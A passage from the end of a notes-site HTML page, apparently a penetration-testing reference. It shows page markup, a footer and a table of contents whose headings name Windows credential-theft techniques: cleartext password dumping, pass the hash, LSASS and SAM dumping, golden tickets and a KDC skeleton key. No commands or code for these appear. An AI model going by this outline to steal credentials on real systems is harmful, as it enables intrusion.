                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div id="global-graph-outer"><div id="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true}"></div></div></div><div class="toc desktop-only"><button type="button" id="toc" class aria-controls="toc-content" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="toc-content" class><ul class="overflow"><li class="depth-0"><a href="#dumping-cleartext-passwords" data-for="dumping-cleartext-passwords">Dumping cleartext passwords</a></li><li class="depth-0"><a href="#pass-the-hash" data-for="pass-the-hash">Pass the hash</a></li><li class="depth-1"><a href="#local-sam" data-for="local-sam">Local SAM</a></li><li class="depth-1"><a href="#lsass-memory" data-for="lsass-memory">LSASS memory</a></li><li class="depth-1"><a href="#inject-an-ntlm-hash-into-a-process" data-for="inject-an-ntlm-hash-into-a-process">Inject an NTLM hash into a process</a></li><li class="depth-0"><a href="#dumping-kerberos-tickets" data-for="dumping-kerberos-tickets">Dumping Kerberos tickets</a></li><li class="depth-0"><a href="#pass-the-ticket-attacks" data-for="pass-the-ticket-attacks">Pass the ticket attacks</a></li><li class="depth-0"><a href="#golden-and-silver-ticket-attacks" data-for="golden-and-silver-ticket-attacks">Golden and silver ticket attacks</a></li><li class="depth-0"><a href="#pass-the-key-attacks" data-for="pass-the-key-attacks">Pass the key attacks</a></li><li class="depth-0"><a href="#kdc-skeleton-key" data-for="kdc-skeleton-key">KDC skeleton key</a></li><li class="depth-0"><a href="#other-implementations" data-for="other-implementations">Other implementations</a></li><li class="depth-1"><a href="#meterpreter" data-for="meterpreter">meterpreter</a></li><li class="depth-1"><a href="#pure-powershell-implementation" data-for="pure-powershell-implementation">Pure PowerShell implementation</a></li></ul></div></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.4.0</a> © 2025</p><ul><li><a href="/">Home</a></li><li><a href="https://github.com/necopinus/resume/raw/main/resume.pdf">Resume</a></li><li><a href="/#contact">Contact</a></li><li><a href="/grimoire/index.xml">RSS Feed</a></li></ul></footer></div></div></body><script type="application/javascript">function c(){let t=this.parentElement;t.classList.toggle("is-collapsed");let l=t.classList.contains("is-collapsed")?this.scrollHeight:t.scrollHeight;t.style.maxHeight=l+"px";let o=t,e=t.parentElement;for(;e;){if(!e.classList.contains("callout"))return;let n=e.classList.contains("is-collapsed")?e.scrollHeight:e.scrollHeight+o.scrollHeight;e.style.maxHeight=n+"px",o=e,e=e.parentElement}}function i(){let t=document.getElementsByClassName("callout is-collapsible");for(let s of t){let l=s.firstElementChild;if(l){l.addEventListener("click",c),window.addCleanup(()=>l.removeEventListener("click",c));let e=s.classList.contains("is-collapsed")?l.scrollHeight:s.scrollHeight;s.style.maxHeight=e+"px"}}}document.addEventListener("nav",i);window.addEventListener("resize",i);
</script><script src="../postscript.js" type="module"></script></html>